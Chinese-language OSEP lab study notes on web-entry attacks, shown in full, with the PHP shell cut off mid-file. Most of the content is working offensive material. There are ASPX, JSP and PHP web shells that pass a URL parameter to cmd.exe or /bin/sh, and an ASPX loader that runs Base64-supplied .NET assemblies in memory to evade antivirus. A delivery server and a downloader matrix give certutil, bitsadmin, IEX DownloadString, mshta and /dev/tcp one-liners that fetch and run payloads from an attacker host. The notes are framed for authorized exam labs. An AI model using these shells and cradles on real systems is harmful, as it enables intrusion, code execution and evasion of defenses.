::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 模块 M10：Web 入口 —— ASPX Web Shell 与注入后的下载/执行

> 覆盖场景：14、15、16
> > 教材依据：第 8–9 章（托管加载）、第 24 章（Web 与服务账户）、C2/C6（Web 入口）
> 前置依赖：可上传文件或存在注入点的 Web 服务；IIS/.NET（ASPX）或 PHP/JSP 运行时；攻击机有可被目标访问的投递地址

**本模块的共同原则**：
1. **Web 入口的身份通常很低**（IIS 应用池账户、`NT AUTHORITY\NETWORK SERVICE`），拿到后第一件事是 `whoami /priv`——是否有 `SeImpersonatePrivilege` 决定你能不能立刻提权。
2. **公开 Web Shell 一定被杀**——精简到只剩必要功能，第二阶段独立可替换。
3. **命令长度/引号是隐形杀手**——注入点经常截断复杂命令，短第一阶段 + 分离执行几乎总是更稳。

---

## 场景 14：网站允许上传 ASPX，后台是 IIS，目标安装了杀毒软件

**场景回顾**：上传后的 ASPX 会被服务器解析，简单命令执行可用；但公开 Web Shell 或上传的 EXE 被查杀；当前身份是应用池账户。

**前提与假设**：
- 上传目录可被 Web 访问，且允许 `.aspx`（或可改名为 `.ashx`/`.asmx`/`.config`）。
- 目标装了 AV（对落地文件与常见 Web Shell 特征有签名）。
- 已确认当前身份为应用池账户（权限有限但常带 `SeImpersonatePrivilege`）。

**准备（攻击机侧）**：
1. 准备三份材料：
   | 文件 | 用途 |
   |---|---|
   | `m10-minimal-exec.aspx` | 精简执行入口（无 UI、无花哨功能） |
   | `m10-managed-loader.aspx` | 加载托管程序集/内存执行 |
   | `m10-jsp-shell.jsp` / `m10-php-shell.php` | 其它运行时的备选 |
2. 第二阶段做成**可独立替换**的独立文件（避免每次改动都重传 Web Shell）。
3. 投递服务：
   ```bash
   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
   ```

**执行步骤**：
1. 上传精简 ASPX，访问一次，确认能执行：
   ```text
   GET /upload/shell.aspx?cmd=whoami
   ```
2. 立刻确认身份与特权：
   ```text
   cmd=whoami /priv
   cmd=whoami /groups
   ```
3. 若被 AV 查杀 → 精简特征：去掉注释、去掉 `eval`、把命令关键字拆分/编码；或换扩展名与路径。
4. 上传 EXE 被查杀 → 改为**内存加载**：ASPX 只负责把第二阶段字节（Base64）`Assembly.Load` 进 IIS 进程，不落地。
5. 拿到稳定执行后：若有 `SeImpersonatePrivilege` → 转 [06-uac-windows-privesc](/zh/modules/06-uac-windows-privesc) 场景 26。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m10-minimal-exec.aspx` | 精简命令执行 | `cmd` 参数 |
| `m10-managed-loader.aspx` | 托管程序集内存加载 | `b64` 参数 |
| `m10-jsp-shell.jsp` / `m10-php-shell.php` | 非 IIS 环境备选 | `cmd` |
| `m10-download-fallbacks.md` | 下载器备选矩阵 | — |

#### `m10-minimal-exec.aspx` {#m10-minimal-exec-aspx}

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%--
用途：极简 ASPX 命令执行入口——只做一件事：把 URL 参数 cmd 交给 cmd.exe /c 执行，纯文本回显输出。
      无 UI、无上传/下载/文件管理功能、无公开 Web Shell 的特征字符串，尽量降低被 AV 签名命中的概率。
场景：14（上传目录可解析 ASPX，公开 Web Shell 被查杀）、16（注入点长度受限时，用它做长命令通道）
依赖：IIS 6+ / .NET 2.0+；应用池账户权限即可（w3wp.exe 进程内执行）
使用：
  1) 上传后命名为 shell.aspx（或被允许的 .ashx/.asmx）
  2) 访问：http://TARGET/upload/shell.aspx?cmd=whoami%20/priv
  3) 无 cmd 参数时返回空 200（用于判断页面是否已被解析）
占位符：TARGET=目标站点地址；cmd=要执行的命令（需 URL 编码，空格写 %20）
测试状态：未在 IIS 实测；已用 python3 做标签配对/结构检查（见文末说明），需在实验环境验证后再上考场
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string c = Request["cmd"];
    if (c == null || c.Length == 0) return;

    Response.ContentType = "text/plain";

    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + c;
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    psi.WorkingDirectory = "C:\\Windows\\Temp";

    try
    {
        using (Process p = Process.Start(psi))
        {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(30000);
        }
    }
    catch (Exception ex)
    {
        Response.Write(ex.Message);
    }
}
</script>
<%--
自检说明（无 IIS 时的静态检查方式）：
  1) 标签配对：<@ ... %> 与 <script runat="server"> ... </script> 成对出现，<%-- --%> 注释闭合。
  2) C# 大括号配平：用 python3 统计 Page_Load 体内的 { 与 } 数量是否相等。
  3) 引号/分号：ProcessStartInfo 字段赋值与 using 块以分号结尾。
  以上已用 python3 脚本跑过（未安装 .NET 编译器，因此只能做结构检查，真实编译需在 Windows 上用 csc 或 IIS 首访触发）。
--%>
````

#### `m10-managed-loader.aspx` {#m10-managed-loader-aspx}

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%--
用途：托管程序集加载器——把 .NET 程序集以字节数组（Base64 或 POST body）或从磁盘路径读入，
      在 w3wp.exe 进程内 Assembly.Load() 并调用入口点（EntryPoint 或指定 type/method）+ 参数。
      EXE 不落地，用于"禁止 EXE 落地但要用托管工具"的场景。
场景：14（上传的 EXE 被 AV 查杀 → 改内存加载）、20（需要用托管工具但不允许落盘）
依赖：IIS + .NET 4.x（程序集位数/目标框架需与应用池一致；x64 池加载 AnyCPU/x64 程序集）
使用：
  # 1) 字节数组（最常用，配合 docs/10 场景 14 的"传 Base64"）
  curl -k "http://TARGET/upload/loader.aspx?b64=<BASE64程序集>&args=-a%20-b"
  # 2) 从磁盘（程序集已通过别的方式写到目标上）
  curl -k "http://TARGET/upload/loader.aspx?file=C:\Windows\Temp\p.exe&type=Payload.Runner&method=Run"
  # 3) 直接 POST 原始字节（请求体即程序集）
  curl -k --data-binary @payload.exe "http://TARGET/upload/loader.aspx?args=whoami"
  # 不带 type/method 时自动取 asm.EntryPoint；带 type 不带 method 时列出该类型的公开静态方法名。
占位符：TARGET=目标站点；LHOST/URL=程序集来源（本页不主动下载，需下载时配合 m10-download-fallbacks.md）；
        b64=Base64 程序集；file=目标磁盘上的程序集路径；type/method=入口；args=参数（默认按空格切分，可用 argssep 指定分隔符）
测试状态：未在 IIS 实测；已用 python3 做标签配对/大括号配平检查，需在实验环境验证
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/plain";

    string file = Request["file"];
    string b64 = Request["b64"];
    string typeName = Request["type"];
    string methodName = Request["method"];
    string argstr = Request["args"];
    string sep = Request["argssep"];

    byte[] raw = null;
    try
    {
        if (!string.IsNullOrEmpty(file))
            raw = File.ReadAllBytes(file);
        else if (!string.IsNullOrEmpty(b64))
            raw = Convert.FromBase64String(b64);
        else if (Request.ContentLength > 0)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                Request.InputStream.CopyTo(ms);
                raw = ms.ToArray();
            }
        }
    }
    catch (Exception ex)
    {
        Response.Write("read error: " + ex.Message);
        return;
    }

    if (raw == null || raw.Length == 0) return;

    string[] argv;
    if (string.IsNullOrEmpty(argstr))
        argv = new string[0];
    else if (!string.IsNullOrEmpty(sep))
        argv = argstr.Split(new string[] { sep }, StringSplitOptions.RemoveEmptyEntries);
    else
        argv = argstr.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

    try
    {
        Assembly asm = Assembly.Load(raw);

        MethodInfo mi = null;
        if (string.IsNullOrEmpty(typeName))
        {
            mi = asm.EntryPoint;
        }
        else
        {
            Type t = asm.GetType(typeName);
            if (t == null)
            {
                Response.Write("type not found: " + typeName);
                return;
            }
            if (string.IsNullOrEmpty(methodName))
            {
                foreach (MethodInfo m in t.GetMethods(BindingFlags.Public | BindingFlags.Static))
                    Response.Write(m.Name + "/" + m.GetParameters().Length + " ");
                return;
            }
            mi = t.GetMethod(methodName,
                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance);
        }

        if (mi == null)
        {
            Response.Write("entry point not found");
            return;
        }

        ParameterInfo[] ps = mi.GetParameters();
        object[] parameters;
        if (ps.Length == 0)
            parameters = null;
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
            parameters = new object[] { argv };
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string))
            parameters = new object[] { argstr == null ? "" : argstr };
        else
        {
            StringBuilder sb = new StringBuilder();
            foreach (ParameterInfo pi in ps) sb.Append(pi.ParameterType.Name).Append(" ");
            Response.Write("signature mismatch, need: " + sb.ToString());
            return;
        }

        // 托管工具多半往 Console 打结果，这里接管 Console.Out 把输出一并返回
        TextWriter old = Console.Out;
        StringWriter captured = new StringWriter();
        object result = null;
        string error = null;
        try
        {
            Console.SetOut(captured);
            object instance = mi.IsStatic ? null : Activator.CreateInstance(mi.DeclaringType);
            result = mi.Invoke(instance, parameters);
        }
        catch (TargetInvocationException tie)
        {
            error = tie.InnerException == null ? tie.Message : tie.InnerException.Message;
        }
        finally
        {
            Console.SetOut(old);
        }

        Response.Write(captured.ToString());
        if (error != null)
            Response.Write("invoke error: " + error);
        else if (result != null)
            Response.Write(result.ToString());
    }
    catch (Exception ex)
    {
        Response.Write("load error: " + ex.Message);
    }
}
</script>
<%--
自检说明（无 IIS 时的静态检查方式）：
  1) 标签配对：<%@ %>、<script runat="server">...</script>、<%-- --%> 三者闭合。
  2) C# 大括号配平：用 python3 统计 Page_Load 体内 { 与 } 数量相等、括号成对。
  3) 用到的每个类都在 Import 或全名范围内（System.Reflection / System.IO / System.Text 已 Import）。
  真实编译验证：在 Windows 上把 <script> 内代码粘进 .cs 用 csc /t:library 编译即可确认语法。
--%>
````

#### `m10-jsp-shell.jsp` {#m10-jsp-shell-jsp}

````xml
<%--
用途：精简 JSP 命令执行入口——Tomcat/Jetty/JBoss 等容器下的备选通道；自动按 os.name 选择
      /bin/sh -c（Linux）或 cmd.exe /c（Windows），标准输出与错误输出合并回显。
场景：14 的备选（Web 入口存在，但运行时是 JSP 而不是 ASPX）、16（作为长度受限注入点之外的长命令通道）
依赖：Servlet 容器（Tomcat 7+ / JDK 6+）；容器进程账户权限即可
使用：
  1) 上传到可访问的 webapps 目录（如 /var/lib/tomcat9/webapps/ROOT/shell.jsp）
  2) 访问：http://TARGET/shell.jsp?cmd=id
  3) 无 cmd 参数时返回 "ready"（确认页面已被容器编译执行）
占位符：TARGET=目标站点；cmd=要执行的命令（需 URL 编码）
测试状态：未在 Tomcat 实测；已用 python3 做标签配对/结构检查，需在实验环境验证
--%>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
    String c = request.getParameter("cmd");
    if (c == null || c.trim().length() == 0) {
        out.print("ready");
        return;
    }

    String os = System.getProperty("os.name").toLowerCase();
    String[] real;
    if (os.indexOf("win") >= 0)
        real = new String[] { "cmd.exe", "/c", c };
    else
        real = new String[] { "/bin/sh", "-c", c };

    try {
        ProcessBuilder pb = new ProcessBuilder(real);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        br.close();
        p.waitFor();
    } catch (Exception e) {
        out.println("error: " + e.getMessage());
    }
%>
<%--
自检说明（无 Tomcat 时的静态检查方式）：
  1) 标签配对：<%@ page %> 指令与 <% ... %> 脚本段闭合，<%-- --%> 注释闭合。
  2) Java 大括号/括号配平：用 python3 统计 { } 与 ( ) 数量相等。
  3) 真实编译验证：Tomcat 首次访问即编译；或把脚本段抽成 .java 用 javac 验证语法。
--%>
````

#### `m00-delivery-server.py` {#m00-delivery-server-py}

````python
#!/usr/bin/env python3
"""用途：投递服务器——HTTP/HTTPS 双通道，记录每个请求的来源、User-Agent、路径，用于确认"目标是否真的下载了"

场景：通用基础设施（配合 docs/00-environment-and-infra.md；支撑场景 3、8、15、16、17、28、30、31 的投递与排错）

依赖：Python 3.7+（标准库）；HTTPS 需要 cert/key（可用 openssl 或 m00-build-payloads.sh 生成）

使用：
    # HTTP（默认 80）
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS（自签）
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # 只做探测模式：不返回文件，只记录请求（确认目标出网路径）
    python3 m00-delivery-server.py --port 8000 --probe-only

占位符：LHOST=攻击机 IP（脚本会打印可用 URL）；PAYLOAD=放在 --dir 下的载荷文件名

测试状态：已在 macOS 本机用 Python 3 语法校验（py_compile）；HTTP 模式可直接运行验证
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """带结构化日志的静态文件服务；probe-only 模式只记录不返回文件。"""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # 抑制默认 stderr 输出，统一走 _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # 兜底：探测默认路由出口地址
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP 投递服务器（HTTP/HTTPS + 请求日志）")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="日志路径，默认 <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="只记录请求，不返回文件")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] 投递根目录: {root}")
    print(f"[*] 请求日志:   {log_path}")
    print(f"[*] 模式:       {'probe-only（只记录）' if args.probe_only else '文件投递'}")
    print("[*] 可用地址:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C 停止")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 已停止")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m10-download-fallbacks.md` {#m10-download-fallbacks-md}

````markdown
# 下载器备选矩阵（场景 15 / 16 / 17）

> 用途：命令执行后某个下载工具被拦时，按"被拦 → 换哪个"的顺序换下一个。**每次只改一个变量**并记录结果。
> 场景：15（注入点可执行命令但下载器被拦）、16（命令长度受限，要用最短写法）、17（无稳定出网时的对照）
> 依赖：攻击机侧投递服务 `python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads`
> 占位符：`LHOST`（攻击机 IP）、`LPORT`（攻击机端口）、`PAYLOAD`（投递文件名）、`URL`（完整 http(s) 地址）、`TARGET`（目标）
> 测试状态：命令模板已逐条人工核对参数顺序；未在目标环境实测，考试前按第 5 节做一次无害下载验证

---

## 1. 主顺序（Windows 目标）：被拦就顺着往下换

| 顺序 | 工具 | 命令模板 | 长度 | 被拦时换下一个的判断 |
|---|---|---|---|---|
| 1 | `curl` | `curl -s -o C:\Windows\Temp\PAYLOAD URL` | 中 | Win10 1803+ 自带，最常可用；报"不是内部或外部命令"→ 说明系统太老，换 2 |
| 2 | `certutil` | `certutil -urlcache -split -f URL C:\Windows\Temp\PAYLOAD` | 中 | 常被 AppLocker/AV 拦（报"拒绝访问"或返回码非 0）→ 换 3；用完记得 `certutil -urlcache -split -f URL delete` 清缓存条目 |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal URL C:\Windows\Temp\PAYLOAD` | 长 | 走 BITS 服务，日志明显；报"无法连接到 BITS"→ 换 4 |
| 4 | PowerShell `DownloadString`（内存，不落地） | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | 长 | 注意 AMSI（见 `m05-amsi-bypass-variants.ps1`）；被 AMSI/CLM 拦 → 换 5 |
| 5 | PowerShell `WebClient.DownloadFile` | `powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('URL','C:\Windows\Temp\PAYLOAD')"` | 长 | 与 4 是同一类客户端，都失败说明 PowerShell 层被拦 → 换 6 |
| 6 | `wget`（若目标已安装） | `wget -q URL -O C:\Windows\Temp\PAYLOAD` | 短 | 少见；未安装 → 换 7 |
| 7 | Python one-liner（目标有 Python） | `python -c "import urllib.request;urllib.request.urlretrieve('URL','C:\\Windows\\Temp\\PAYLOAD')"` | 中 | 无 Python → 换 8 |
| 8 | `rundll32` + `url.dll`（只发起请求/取文件，常用于连通性验证） | `rundll32.exe url.dll,OpenURL URL` | 中 | 会弹关联程序，一般只用来证明"能出网"；真正落文件用 9 |
| 9 | `regsvr32` / `mshta` 远程执行（不落 EXE，直接拉脚本） | `mshta http://LHOST/PAYLOAD.hta` | 短 | 受 AV/AMSI 关注；用法见 `docs/02-hta.md` |
| 10 | `ncat`/`nc`（最后手段，需我方配合） | 目标：`ncat LHOST LPORT > C:\Windows\Temp\PAYLOAD`；攻击机：`ncat -lvnp LPORT < PAYLOAD` | 短 | 需要目标装有 ncat，且要能交互/后台执行 |

**顺序记忆法**：curl → certutil → bitsadmin → PowerShell → wget → python → rundll32 → nc。

---

## 2. Linux 目标（同一思路）

| 顺序 | 命令模板 |
|---|---|
| 1 | `curl -s URL -o /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 2 | `wget -q URL -O /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 3 | `python3 -c "import urllib.request;urllib.request.urlretrieve('URL','/tmp/.PAYLOAD')"` |
| 4 | `python -c "import urllib;urllib.urlretrieve('URL','/tmp/.PAYLOAD')"`（Python2 老目标） |
| 5 | `bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.PAYLOAD'`（bash 内建，最难被拦；攻击机需 `ncat -lvnp LPORT < PAYLOAD`） |
| 6 | `printf 'GET /PAYLOAD HTTP/1.0\r\n\r\n' > /dev/tcp/LHOST/LPORT`（只验证出网） |

---

## 3. 命令长度受限时的最短写法（场景 16）

```text
# 先只下载（约 30 字符，最短）
curl -so a http://LHOST/a
# 再执行（2 字符）
a

# 一行版（约 35 字符）
curl -so a http://LHOST/a&a

# certutil 最短（约 40 字符）
certutil -urlcache -f http://LHOST/a a

# PowerShell 最短（约 60 字符，含 -c 引号）
powershell -c "iwr http://LHOST/a -o a"
```

**先测长度上限**再选工具：逐步加长无害命令（`echo AAAA...`），找到被截断的边界；注入点若过滤空格或引号，改用 `+` 或 Base64 参数版本（见 `docs/10-web-entry-webshell.md` 场景 16）。

---

## 4. 下载后校验（必须做，否则会浪费时间排查"假成功"）

```cmd
certutil -hashfile C:\Windows\Temp\PAYLOAD MD5
```
```bash
md5sum /tmp/.PAYLOAD          # Linux 目标
```
与攻击机 `md5sum ~/osep/payloads/PAYLOAD` 对比：哈希不一致 = 被代理/缓存篡改或未下载完整。

---

## 5. 排查纪律（按现象定位，不要乱试）

| 现象 | 结论 | 下一步 |
|---|---|---|
| 投递日志**没有**请求 | 工具被拦或命令根本没执行 | 换工具（本文件第 1 节顺序）；先跑 `curl -s -o nul URL` 验证执行链 |
| 有请求但目标文件不存在 | 写入路径无权限 / 被 AV 秒删 | 换目录（`%TEMP%`、`C:\ProgramData\`）、改文件名 |
| 文件存在但哈希不符 | 代理/缓存篡改 | 换 HTTPS（`docs/09` 场景 31）或分段校验 |
| 文件正确但执行失败 | 静态/行为检测 | 转 `docs/05-applocker-clm-amsi.md` 场景 18/19 |
| 所有下载器都被拦 | 传输通道不通 | 改上传通道（`m10-managed-loader.aspx` 传 Base64）、代理（场景 28）、DNS（场景 32）、域前置（场景 33） |

---

## 6. 相关脚本

| 脚本 | 用途 |
|---|---|
| `m00-delivery-server.py` | 投递 + 请求日志（判断"有没有真的发起请求"） |
| `m10-minimal-exec.aspx` | 有 Web Shell 时的长命令执行通道 |
| `m10-managed-loader.aspx` | 下载全被拦时，用 Base64 把第二阶段直接传进内存 |
| `m05-amsi-bypass-variants.ps1` | PowerShell 下载器被 AMSI 拦时的处理 |
| `m09-https-listener.sh` | 需要 HTTPS 投递时起 TLS 监听 |
````

**验证**：HTTP 200 且返回命令输出；`whoami` 显示应用池账户；`tasklist` 中出现 `w3wp.exe`（ASPX 在 w3wp 进程内执行）。

**失败分支与备选**：
1. **ASPX 被查杀** → 精简 + 编码；或改用 `.ashx`/`.asmx`；或上传 `.config` 触发解析（视环境）。
2. **EXE 被查杀** → 内存加载（`Assembly.Load`），或用 PowerShell 反射（若 w3wp 允许）。
3. **上传被限制**（扩展名白名单） → 找其它上传点、解析漏洞、或注入点（场景 15/16）。
4. **应用池账户权限太低且无 SeImpersonate** → 找同服务器上的其它服务账户（IIS 配置、连接字符串里的凭据）。

**考试注意 / OPSEC**：Web Shell 只当"执行入口"，所有重活交给独立第二阶段；这样每次被查杀只需要换一个文件，不用重新找上传点。

---

## 场景 15：经典 ASP 网站存在 SQL 注入，可以执行系统命令，但下载器被拦

**场景回顾**：已通过数据库获得命令执行，但用某种系统下载工具失败，换另一种却可以下载同一个文件。→ 准备的是**传输备选路线**，不是重新准备注入工具。

**前提与假设**：
- 已能通过注入点执行系统命令（`xp_cmdshell` 或等效）。
- 目标可出网，但某些下载工具被应用控制/AV/代理拦截。
- 已有一个验证过的 EXE/脚本作为第二阶段。

**准备（攻击机侧）**：准备下载器备选矩阵（`m10-download-fallbacks.md`）

| 优先级 | 工具 | 命令模板 | 备注 |
|---|---|---|---|
| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Win10+ 自带，最常可用 |
| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | 经典，常被策略拦 |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | 走 BITS 服务 |
| 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | 注意 AMSI |
| 5 | `wget`/`nc` | `nc LHOST 80 > p.exe`（需交互） | 最后手段 |

**执行步骤**：
1. 先确认出网：注入点执行 `curl -s -o nul http://LHOST/ping`（我方日志出现即成功）。
2. 按矩阵顺序试下载器，每次换一个，**只改一个变量**。
3. 下载完成后校验：`certutil -hashfile C:\Windows\Temp\p.exe MD5` 与攻击机一致。
4. 再执行；执行被拦 → 转 `docs/05` 场景 18/19 的免杀/行为处理。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m10-download-fallbacks.md` | 下载器备选矩阵与命令 | LHOST/URL |
| `m10-minimal-exec.aspx` | 有 Web Shell 时的替代执行通道 | `cmd` |

**验证**：投递服务日志出现目标 IP 的请求；目标侧文件存在且哈希一致；执行后有回连或输出。

**失败分支与备选**：
1. **所有下载器都被拦** → 改用"上传"通道（Web Shell/上传点）或内嵌 Base64 分段写入。
2. **只允许特定域名出网** → 域前置 / 代理（[09-c2-egress-channels](/zh/modules/09-c2-egress-channels)）。
3. **命令被转义/截断** → 换短命令（场景 16）。

**考试注意 / OPSEC**：下载器失败**不代表网络不通**——先看投递日志，区分"没发起请求"（工具被拦）与"请求了但没回来"（网络/代理问题）。

---

## 场景 16：Web 命令注入只接受很短的命令

**场景回顾**：内部页面提供 ping 等功能，存在命令注入，但参数长度有限，复杂引号和多层命令容易被截断。

**前提与假设**：
- 注入点存在，但长度/字符集受限（常见 <100 字符）。
- 目标可出网（否则走内嵌）。

**准备（攻击机侧）**：
1. 准备**极短的第一阶段**（把长命令换成"下载一个脚本再执行"）：
   ```text
   # 先只下载（约 40 字符）
   certutil -urlcache -f http://LHOST/a a
   # 再执行
   a
   ```
2. 准备适合目标解释器的编码参数版本（Base64 传参、避免引号）。
3. 第二阶段脚本预先放好，文件名尽量短（`a`、`b`）。

**执行步骤**：
1. 先测长度上限：逐步加长无害命令（`echo AAAA...`）确定边界。
2. 用"下载 + 执行"两段式：第一步只写文件，第二步只执行。
3. 每步都通过投递日志确认（目标是否真的发起了请求）。
4. 若引号被截断 → 改用 Base64/十六进制参数，或把内容写进文件后执行。
5. 若长度仍不够 → 用重定向拼接多段（`>a`、`>>a`）分多次写入。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m10-download-fallbacks.md` | 短命令下载模板 | LHOST |
| `m10-minimal-exec.aspx` | 有 Web Shell 时的长命令通道 | `cmd` |

**验证**：投递日志按顺序出现请求；目标侧文件存在；执行后有回连/输出。

**失败分支与备选**：
1. **两段式仍被截断** → 用更短的下载器（`bitsadmin /transfer` 也长；优先 `curl -o a http://LHOST/a`）。
2. **目标无出网** → 内嵌 Base64（但受长度限制，需要多段拼接）。
3. **注入点过滤关键字**（`curl`/`certutil` 被过滤） → 换等价工具或编码参数。

**考试注意 / OPSEC**：先花两分钟测长度上限，比反复猜要快得多；文件名越短越好。

---

## 模块速查表

| 目的 | 命令/要点 |
|---|---|
| 精简 ASPX 执行 | `m10-minimal-exec.aspx`（访问时加 `?cmd=whoami`） |
| 内存加载第二阶段 | `m10-managed-loader.aspx?b64=...` |
| 身份与特权 | `whoami /priv`（重点看 SeImpersonatePrivilege） |
| 下载器备选顺序 | curl → certutil → bitsadmin → PowerShell → nc |
| 哈希校验 | `certutil -hashfile p.exe MD5` |
| 命令长度受限 | 短第一阶段 + 下载执行分离 |
| 被查杀 | 精简特征 / 编码 / 换扩展名 / 内存加载 |

## 关联脚本清单

| 脚本 | 说明 |
|---|---|
| `m10-minimal-exec.aspx` | 精简执行入口 |
| `m10-managed-loader.aspx` | 托管程序集加载 |
| `m10-jsp-shell.jsp` | JSP 备选 |
| `m10-php-shell.php` | PHP 备选 |
| `m10-download-fallbacks.md` | 下载器备选矩阵 |
| `m05-amsi-bypass-variants.ps1` | PowerShell 下载时的 AMSI 处理 |
| `m00-delivery-server.py` | 投递与请求日志 |

#### `m10-php-shell.php` {#m10-php-shell-php}

````php
<?php
/*
用途：精简 PHP 命令执行入口——覆盖 LAMP / nginx+php-fpm / IIS+PHP 场景；按 PHP_OS 自动选择
      /bin/sh -c（Linux）或 cmd /c（Windows）；命令执行函数按可用情况逐级降级。
场景：14 的备选（Web 入口存在但运行时是 PHP）、15/16（有注入/上传但需要稳定的长命令通道）
依赖：PHP 5.4+；proc_open / shell_exec / exec / system / passthru / popen 至少有一个未被 disable_functions
使用：
  1) 上传到 Web 可访问目录（如 /var/www/html/shell.php）
  2) 访问：http://TARGET/shell.php?cmd=id
  3) 无 cmd 参数时返回 "ready"（确认 PHP 已解析且未被 WAF 拦）
占位符：TARGET=目标站点；cmd=要执行的命令（需 URL 编码）
测试状态：未在目标实测；已用 php -l（无 PHP 环境时用 python3 做标签配对检查）通过语法检查
*/

if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
    header('Content-Type: text/plain; charset=UTF-8');
    echo "ready";
    exit;
}

$cmd = $_REQUEST['cmd'];
